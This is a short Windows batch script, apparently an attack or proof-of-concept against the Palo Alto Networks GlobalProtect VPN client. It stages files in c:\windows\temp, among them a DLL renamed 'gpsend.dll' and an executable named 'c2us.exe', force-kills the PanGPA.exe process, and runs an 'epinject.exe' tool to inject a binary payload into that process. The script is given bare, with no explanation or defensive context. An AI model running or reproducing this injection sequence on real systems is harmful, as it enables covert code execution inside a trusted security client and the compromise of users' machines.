copy /Y gpcaupgrade.dll c:\windows\temp\gpsend.dll
copy /Y c2us.exe c:\windows\temp\c2us.exe
md c:\windows\temp\pagp\
copy /Y GlobalProtect.msi c:\windows\temp\pagp\
taskkill /f /t /im PanGPA.exe
.\epinject.exe "C:\Program Files\Palo Alto Networks\GlobalProtect\PanGPA.exe" .\loadgpsend.bin